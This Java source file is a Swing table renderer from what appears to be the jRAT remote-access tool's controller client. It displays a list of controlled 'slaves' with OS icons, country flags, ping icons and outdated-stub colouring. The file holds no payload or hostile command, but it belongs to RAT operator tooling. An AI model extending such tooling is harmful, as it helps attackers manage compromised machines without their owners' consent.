package se.jrat.client.ui.renderers.table;

import java.awt.Color;
import java.awt.Component;
import java.net.URL;

import javax.swing.ImageIcon;
import javax.swing.JCheckBox;
import javax.swing.JLabel;
import javax.swing.JTable;
import javax.swing.table.DefaultTableCellRenderer;

import se.jrat.client.AbstractSlave;
import se.jrat.client.Main;
import se.jrat.client.settings.Colors;
import se.jrat.client.ui.frames.Frame;
import se.jrat.client.utils.IconUtils;
import se.jrat.client.utils.Utils;
import se.jrat.common.OperatingSystem;
import se.jrat.common.Version;


@SuppressWarnings("serial")
public class MainTableRenderer extends DefaultTableCellRenderer {

	public static final ImageIcon OS_WIN = IconUtils.getIcon("os");
	public static final ImageIcon OS_WIN8 = IconUtils.getIcon("os_win8");
	public static final ImageIcon OS_MAC = IconUtils.getIcon("os_mac");
	public static final ImageIcon OS_LINUX = IconUtils.getIcon("os_linux");
	public static final ImageIcon OS_ANDROID = IconUtils.getIcon("NONE"); //TODO
	public static final ImageIcon OS_OTHERS = IconUtils.getIcon("last_modified");

	public MainTableRenderer() {
		setOpaque(true);
	}

	public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
		JLabel lbl = (JLabel) super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);

		AbstractSlave slave = Utils.getSlave(table.getValueAt(row, 3).toString());
		
		if (slave != null && !isSelected && !slave.getVersion().equals(Version.getVersion()) && !slave.getVersion().equals("")) {
			setForeground(Colors.getGlobal().getColorFromIndex(Colors.getGlobal().get("outdated stubs").getIndex()));
		} else if (isSelected) {
			setForeground(Color.white);
		} else {
			setForeground(Color.black);
		}

		if (column == 4) {
			lbl.setIcon(IconUtils.getPingIcon(slave));
		} else if (column == 6) {
			if (slave.getOS() == OperatingSystem.WINDOWS) {
				if (slave.getOperatingSystem().startsWith("Windows 8")) {
					lbl.setIcon(OS_WIN8);
				} else {
					lbl.setIcon(OS_WIN);
				}
			} else if (slave.getOS() == OperatingSystem.OSX) {
				lbl.setIcon(OS_MAC);
			} else if (slave.getOS() == OperatingSystem.LINUX) {
				lbl.setIcon(OS_LINUX);
			} else if (slave.getOS() == OperatingSystem.ANDROID) {
				lbl.setIcon(OS_ANDROID);
			} else {
				lbl.setIcon(OS_OTHERS);
			}
		} else if (column == 0 && !Frame.thumbnails) {
			String path;

			String color = Integer.toHexString(lbl.getForeground().getRGB() & 0xffffff) + "";
			if (color.length() < 6) {
				color = "000000".substring(0, 6 - color.length()) + color;
			}


			path = "/flags/" + slave.getCountry().toLowerCase() + ".png";
			
			JCheckBox b = new JCheckBox(value.toString(), slave.isSelected());

			b.setToolTipText(row + "");
			b.setBackground(lbl.getBackground());

			URL url = Main.class.getResource(path);

			if (url == null) {
				url = Main.class.getResource("/flags/unknown.png");
			}

			b.setText("<html><table cellpadding=0><tr><td><img src=\"" + url.toString() + "\"/></td><td width=3><td><font color=\"#" + color + "\">" + value + "</font></td></tr></table></html>");

			return b;
		} else {
			lbl.setIcon(null);
		}
		return lbl;
	}
}